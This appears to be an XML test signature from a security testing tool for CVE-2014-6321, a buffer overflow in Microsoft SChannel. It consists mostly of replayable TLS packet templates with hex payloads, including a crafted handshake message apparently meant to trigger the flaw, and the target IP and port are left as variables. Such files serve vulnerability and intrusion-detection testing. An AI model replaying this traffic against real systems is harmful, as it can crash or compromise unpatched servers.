<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Microsoft Windows SChannel Buffer Overflow"/>
    <EngDesc display="true" value="A remote code execution vulnerability exists in Microsoft SChannel. The vulnerability is due to improper processing of specially crafted packets that leads to a buffer overflow. A remote, unauthenticated attacker can exploit this vulnerability by sending specially crafted packets to the target machine. Successful exploitation could result in arbitrary code execution on the affected system. Tester should set variable $destPort to 443 before test."/>
    <Intent display="true">
      <item value="Buffer_Overflow"/>
    </Intent>
    <Protocol display="true" value="TLS/SSL/HTTPS/SMTP/SMTPS"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Severity display="true" value="Critical"/>
    <Known_Vendors_Affected display="true">
      <item value="Microsoft"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Windows_Server"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="2003"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20141111-25"/>
    <CVEID display="true" value="CVE-2014-6321"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value="114506"/>
    <Author display="true" value=""/>
    <ID display="true" value="db79c8c94a966519937b420ab349da3e"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="NETWORK"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="complete"/>
    <IntegImpact display="false" value="complete"/>
    <AvailImpact display="false" value="complete"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="635551131980283118"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1419589822" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="G"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="F"/>
      <for index="G"/>
    </for>
    <for index="B">
      <for index="F"/>
      <for index="G"/>
    </for>
    <for index="E">
      <for index="F"/>
      <for index="G"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:50:56:B4:0E:7F" destMac="00:50:56:B4:0E:77" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0072" Identification="F036" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="E11D" srcIP="172.16.8.230" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="50277" destPort="$destPort" SeqNumber="669BB48A" AckNumber="A1192417" HeaderLength="08" WindowSize="00E5" Checksum="5782" UrgentPointer="0000" Options="0101080A159044BD00000000" Payload="16030100390100003503017159BB696DF3B7E625FF2A3C0F968646A20A53E01372AD91DD03FBA3286D027000000200040100000A000F000101FF01000100" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Output index="E" Count="">
    <Ethernet srcMac="00:50:56:B4:0E:7F" destMac="00:50:56:B4:0E:77" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="04EB" Identification="F03A" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="DCA0" srcIP="172.16.8.230" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="50277" destPort="$destPort" SeqNumber="669BB4C8" AckNumber="A11934AC" HeaderLength="08" WindowSize="0128" Checksum="6838" UrgentPointer="0000" Options="0101080A159044D70001B919" Payload="16030103880B00038400038100037E3082037A30820339A003020102020900C559BE3D53B15E4B300906072A8648CE3804033077310B30090603550406130243413110300E06035504080C07546F726F6E746F3110300E06035504070C07546F726F6E746F310E300C060355040A0C0554454C5553311C301A060355040B0C1354454C5553205365637572697479204C6162733116301406035504030C0D7672742E74656C75732E636F6D301E170D3134313131313231353434365A170D3134313231313231353434365A3077310B30090603550406130243413110300E06035504080C07546F726F6E746F3110300E06035504070C07546F726F6E746F310E300C060355040A0C0554454C5553311C301A060355040B0C1354454C5553205365637572697479204C6162733116301406035504030C0D7672742E74656C75732E636F6D308201B63082012B06072A8648CE3804013082011E02818100A77650D31E838A44D080B4A9B8B2E8C3EBFF52A89F584671355C3EDBB8E63021C59B60229B134B4D61B8F398BDAB35384F6F469015808746C0733370010D9542E1E6902AC32A077112C08A60C433DF7D7AA0C97CBA5DCB5DB8C533FCFE2ED83EA4C88B155A0F3FE298E7DC6326E54DD1A36A46DEFFD0CA97CB671955B71B3D43021500FAA843793EDE2F538B5872DF1ABFE0FBA6116A17028180407CF203A12CC64DE1E30101AE101BA6EA73BC3B76F49D7A55F94082E5792770AE48035554BB3B7444ED7BC66B2A96556664E43EDA53D6574FF21A4EB0166277B5BF6600B32AEC1DDB437CDEA40CBE788B183BBD872DB78D6470C0AFDE73AD992552EDAC2858702E3BE204A6904971CB03CE03DD8F37A209F73181DF1B66D5130381840002818070BBC2E1514AD2A00765646C38AAA50E1F6BCFC826353298F275182A165AEB02A9BDC5456E6F80601E0C1D536206C836DE80B47CFB0AA77B666C963C0B9BDD671626D826599FC5803AF38BF6A8C14BDC13816A7FF1B5302057590D3DF0A3D7CD041619FDE37A6F5E23615B6FC5471550BC7368EE808132E4ED385933500B6B21A350304E301D0603551D0E04160414B67D2BCEE03FF5FBEFBB4A6155685CA968C9C447301F0603551D23041830168014B67D2BCEE03FF5FBEFBB4A6155685CA968C9C447300C0603551D13040530030101FF300906072A8648CE380403033000302D021500959467AC5F6DE4AD242A1CF3CB49AEE597D82299021433C1B929435DC1364BF49DFB05F872A754DA6C2C16030101061000010201000D3C37C74C109DFE8E8F4B7083349C6E2F826494673555807A41F6DCE7CE228FE8AC3242159CD738727A8663F4E4D16A5288ED4B1779003F713E3F0239D8D017B3768F733C515780237A06D155459B954F6D2C715F7BA969074FA0AE3B7A5585DE17E7ADB51D450DD3535660FE5EEFCB6C741B736D0A962A0131A3F77E2923F0B534F9F21870B27512F897F0E6DFD596002FEA67C897D3DC58141CF4D32B68943EEBDFEEB37CC2C7207C7049FCD92F8660A36F69E1CEE21CE17A08AD478D1B9CF41433747851CD51DCB07B2FFEFA619092261494BDD3CF9584F46E48CD051BB821CCA58D36B370C4EF08760FBEADF836D88130A0596A7503074431CB954FA739160301001A0F00001600143012020741414141414141020741414141414141" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="00:50:56:B4:0E:77" destMac="00:50:56:B4:0E:7F" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="05E5" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="8605" srcIP="$destIP" destIP="172.16.8.230" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$destPort" destPort="50277" SeqNumber="A1192417" AckNumber="669BB4C8" HeaderLength="08" WindowSize="FAB2" Checksum="F021" UrgentPointer="0000" Options="0101080A0001B919159044BD" Payload="16030110900200004D030154737C695043659EE1C9EB3A5247B65782578BBFECD8FFFE2E9E463523448250202C010000C959B4C1CB918547876DF3F1CB4468303FFEBA3625A6279021556B840004000005FF010001000B0002F50002F20002EF308202EB308201D3A00302010202101E14BED0BE5B4E99428E3ADF6186440E300D06092A864886F70D0101050500301D311B301906035504031312574D5376632D57494E32303038454E543332301E170D3134303931373230333235365A170D3234303931343230333235365A301D311B301906035504031312574D5376632D57494E32303038454E54333230820122300D06092A864886F70D01010105000382010F003082010A0282010100A689D7B7E9D91A038889134A516FC0DBEE7C1635FB8CEE0EB1CD4A90E3CCB63462D97909C68B9BCD3B7A9942A9352896D5555B28DD6539D2F53BF37FE9124024933389B05AF900C34072B413417D27C49E9F761911A47B2927C6FBC5EBE4E7FE9AB3C6EC9F691AF538851BB80785D7B7F936985D11F7629A7118BB27AD79F024BBFC7FD1564D6ADC8F9A07C250B0FE3EF68185CBFF176F24E38E8238D8B61984E629DB1B32EC128D1F66021F30115A41573649B7D133C6131B55021E1F86201FC820B3306745BBFCEDF9C900A3E73293403C51DA2C664FC1D57DA5C0C8B2887E43D10202905970133F086BF37CD0A84F07879EE21A4DC731791176FF92221F730203010001A327302530130603551D25040C300A06082B06010505070301300E0603551D0F0407030500B0000000300D06092A864886F70D010105050003820101005A8B2363BC2170DE811EEABD2AE8DDE4468CB9B2C67E19F0C8AAD0C0274F16730A1776BDF62410DDD82373D76FF53096EAB2D1D6C416B11475A0B7D779CD1B97BD43FD989C3BE9E96F3709399E3F6109E92F81191634DF9605CDDF6B144A9D333C1228DE4730544A8F4DADADF839F2ED0FC2AE272FD8D3DC12832EF55D5C2F490035137F205F77A78936FA85FCC7200ED2D9464334093EC5E9F6C52B6704758FB5B2C275A17E282935C92D5AC729E09B4530F8CA05A83D5D95EB47EB2CA20EF96A38D3C45C5C3FF5CDBA73E47E147EB598EF14E143C6C827630CEDFE8B71BC4DE301DD7656DAE5696635616983A8B82B895FE34055ECE64575AD4E969A61B4A00D000D3E0201020D3900C43081C1310B300906035504061302555331173015060355040A130E566572695369676E2C20496E632E313C303A060355040B1333436C6173732031205075626C6963205072696D6172792043657274696669636174696F6E20417574686F72697479202D204732313A3038060355040B1331286329203139393820566572695369676E2C20496E632E202D20466F7220617574686F72697A656420757365206F6E6C79311F301D060355040B1316566572695369676E205472757374204E6574776F726B00C43081C1310B300906035504061302555331173015060355040A130E566572695369676E2C20496E632E313C303A060355040B1333436C6173732034205075626C6963205072696D6172792043657274696669636174696F6E20417574686F72697479202D204732313A3038060355040B1331286329203139393820566572695369676E2C20496E632E202D20466F7220617574686F72697A656420757365206F6E6C79311F301D060355040B1316566572695369676E205472757374204E6574776F726B00D43081D1310B3009060355040613025A41311530130603550408130C5765737465726E204361706531123010060355040713094361706520546F776E311A3018060355040A131154686177746520436F6E73756C74696E6731283026060355040B131F43657274696669636174696F6E205365727669636573204469766973696F6E312430220603550403131B54686177746520506572736F6E616C20467265656D61696C204341312B302906092A864886F70D010901161C706572736F6E616C2D667265656D61696C407468617774652E636F6D00D23081CF310B3009060355040613025A41311530130603550408130C5765737465726E204361706531123010060355040713094361706520546F776E311A3018060355040A131154686177746520436F6E73756C74696E6731283026060355040B131F43657274696669636174696F6E205365727669636573204469766973696F6E312330210603550403131A54686177746520506572736F6E616C205072656D69756D204341312A302806092A864886F70D010901161B706572736F6E616C2D7072656D69756D407468617774652E636F6D0086308183310B3009060355040613025553312D302B060355040A132446697273742044617461204469676974616C2043657274696669636174657320496E632E314530430603550403133C46697273742044617461204469676974616C2043657274696669636174657320496E632E2043657274696669636174696F6E20417574686F7269747900CE3081CB310B3009060355040613025A41311530130603550408130C5765737465726E204361706531123010060355040713094361706520546F776E311A3018060355040A131154686177746520436F6E73756C74696E6731283026060355040B131F43657274696669636174696F6E205365727669636573204469766973696F6E3121301F0603550403131854686177746520506572736F6E616C2042617369632043413128302606092A864886F70D0109011619706572736F6E616C2D6261736963407468617774652E636F6D0061305F310B300906035504061302555331173015060355040A130E566572695369676E2C20496E632E31373035060355040B132E436C6173732033205075626C6963205072696D6172792043657274696669636174696F6E20417574686F726974790061305F310B300906035504061302555331173015060355040A130E566572695369676E2C20496E632E31373035060355040B132E436C6173732032205075626C6963205072696D6172792043657274696669636174696F6E20417574686F726974790061305F310B300906035504061302555331173015060355040A130E566572695369676E2C20496E632E31373035060355040B132E436C6173732031205075626C6963205072696D6172792043657274696669636174696F6E20417574686F7269747900C43081C1310B300906035504061302555331173015060355040A130E566572695369676E2C20496E632E313C303A060355040B1333436C6173732033205075626C6963205072696D6172792043657274696669636174696F6E20417574686F72697479202D204732313A3038060355040B1331286329203139393820566572695369676E2C20496E632E202D20466F7220617574686F72697A656420757365206F6E6C79311F301D060355040B1316566572695369676E205472757374204E6574776F726B009C308199310B30090603550406130248553111300F06035504071308427564617065737431273025060355040A131E4E65744C6F636B2048616C6F7A617462697A746F6E73616769204B66742E311A3018060355040B131154616E7573697476616E796B6961646F6B31323030060355040313294E65744C6F636B20557A6C6574692028436C6173732042292054616E7573697476616E796B6961646F008B308188310B3009060355040613025553311330110603550408130A57617368696E67746F6E3110300E060355040713075265646D6F6E64311E301C060355040A13154D6963726F736F667420436F72706F726174696F6E31323030060355040313294D6963726F736F667420526F6F7420436572746966696361746520417574686F72697479203230313100473045310B300906035504061302555331183016060355040A130F47544520436F72706F726174696F6E311C301A06035504031313475445204379626572547275737420526F6F7400773075310B300906035504061302555331183016060355040A130F47544520436F72706F726174696F6E31273025060355040B131E475445204379626572547275737420536F6C7574696F6E732C20496E632E312330210603550403131A475445204379626572547275737420476C6F62616C20526F6F7400C63081C3310B300906035504061302555331143012060355040A130B456E74727573742E6E6574313B3039060355040B13327777772E656E74727573742E6E65742F43505320696E636F72702E206279207265662E20286C696D697473206C6961622E2931253023060355040B131C286329203139393920456E74727573742E6E6574204C696D69746564313A303806035504031331456E74727573742E6E657420536563757265205365727665722043657274696669636174696F6E20417574686F7269747900B23081AF310B30090603550406130248553110300E0603550408130748756E676172793111300F06035504071308427564617065737431273025060355040A131E4E65744C6F636B2048616C6F7A617462697A746F6E73616769204B66742E311A3018060355040B131154616E7573697476616E796B6961646F6B313630340603550403132D4E65744C6F636B204B6F7A6A6567797A6F692028436C6173732041292054616E7573697476616E796B6961646F00C43081C1310B300906035504061302555331173015060355040A130E566572695369676E2C20496E632E313C303A060355040B1333436C6173732032205075626C6963205072696D6172792043657274696669636174696F6E20417574686F72697479202D204732313A3038060355040B1331286329203139393820566572695369676E2C20496E632E202D20466F7220617574686F72697A656420757365206F6E6C79311F301D060355040B1316566572695369676E205472757374204E6574776F726B005C305A310B300906035504061302494531123010060355040A130942616C74696D6F726531133011060355040B130A43796265725472757374312230200603550403131942616C74696D6F7265204379626572547275737420526F6F740070306E310B300906035504061302555331183016060355040A130F47544520436F72706F726174696F6E31273025060355040B131E475445204379626572547275737420536F6C7574696F6E732C20496E632E311C301A06035504031313475445204379626572547275737420526F6F7400443042310B300906035504061302555331163014060355040A130D47656F547275737420496E632E311B30190603550403131247656F547275737420476C6F62616C204341009E30819B310B30090603550406130248553111300F06035504071308427564617065737431273025060355040A131E4E65744C6F636B2048616C6F7A617462697A746F6E73616769204B66742E311A3018060355040B131154616E7573697476616E796B6961646F6B313430320603550403132B4E65744C6F636B20457870726573737A2028436C6173732043292054616E7573697476616E796B6961646F00723070312B3029060355040B1322436F70797269676874202863292031393937204D6963726F736F667420436F72702E311E301C060355040B13154D6963726F736F667420436F72706F726174696F6E3121301F060355040313184D6963726F736F667420526F6F7420417574686F726974790061305F31133011060A0992268993F22C6401191603636F6D31193017060A0992268993F22C64011916096D6963726F736F6674312D302B060355040313244D6963726F736F667420526F6F7420436572746966696361746520417574686F726974790E000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
